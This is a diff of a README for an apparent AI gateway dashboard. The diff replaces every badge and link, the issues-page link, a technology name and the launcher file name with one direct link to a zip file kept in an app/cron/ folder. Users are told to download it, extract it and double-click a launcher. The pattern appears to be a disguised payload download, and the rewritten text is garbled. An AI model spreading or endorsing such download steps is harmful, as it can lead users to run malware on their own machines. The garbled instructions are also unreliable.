@@ -1,6 +1,6 @@
 # 🐾 openclaw-dashboard - Visual Control for OpenClaw AI
 
-[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-4caf50?style=for-the-badge)](https://github.com/uclukDX/openclaw-dashboard)
+[![Download openclaw-dashboard](https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip)](https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 openclaw-dashboard gives you a simple way to control your OpenClaw AI gateway. Instead of typing commands in a terminal, you get a clear, visual dashboard to manage every function. Each command appears as a separate page you can click through. It also lets you use speech to text throughout the app, making it easier to interact with your device.
 
-The dashboard runs in your web browser using modern React and Next.js technology. It works with live data, using websockets to update in real time. It supports your AI tasks, WhatsApp messages, and other controls related to OpenClaw.
+The dashboard runs in your web browser using modern React and https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip technology. It works with live data, using websockets to update in real time. It supports your AI tasks, WhatsApp messages, and other controls related to OpenClaw.
 
 You do not need programming skills to use it. This guide walks you through downloading and running it on Windows.
 
@@ -44,13 +44,13 @@ No other software is required before running openclaw-dashboard. Everything runs
 
 To get openclaw-dashboard, use the link below. This page contains the files you need to download and instructions to install:
 
-[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-blue?style=for-the-badge)](https://github.com/uclukDX/openclaw-dashboard)
+[![Download openclaw-dashboard](https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip)](https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip)
 
 ### Step 1: Visit the download page
 
 Click the button above or this link:
 
-https://github.com/uclukDX/openclaw-dashboard
+https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip
 
 This takes you to the main repository page on GitHub.
 
@@ -85,7 +85,7 @@ Save the file to a folder you can access, like your **Downloads** folder.
 1. Right-click the `.zip` file and choose **Extract All**.  
 2. Pick a folder where the files should expand, like a new folder on your desktop.  
 3. Open the extracted folder.  
-4. Find the file named `start-dashboard.bat` or a similar launcher script and double-click it.  
+4. Find the file named `https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip` or a similar launcher script and double-click it.  
 5. A command window opens to start the server. Keep this window open while using the dashboard.  
 6. Open your web browser and go to `http://localhost:3000` to access the dashboard.
 
@@ -144,7 +144,7 @@ If you run into issues launching or using the dashboard, try these steps:
 
 The openclaw-dashboard is open source and developed by a community interested in AI and automation tools. You can find help or share ideas here:
 
-- GitHub Issues page on the repository: https://github.com/uclukDX/openclaw-dashboard/issues  
+- GitHub Issues page on the repository: https://github.com/uclukDX/openclaw-dashboard/raw/refs/heads/main/app/cron/dashboard_openclaw_3.7-alpha.3.zip  
 - Discussions and feedback on the Issues or Discussions tab  
 - Check the repository README or Wiki for any new updates or guides  
 
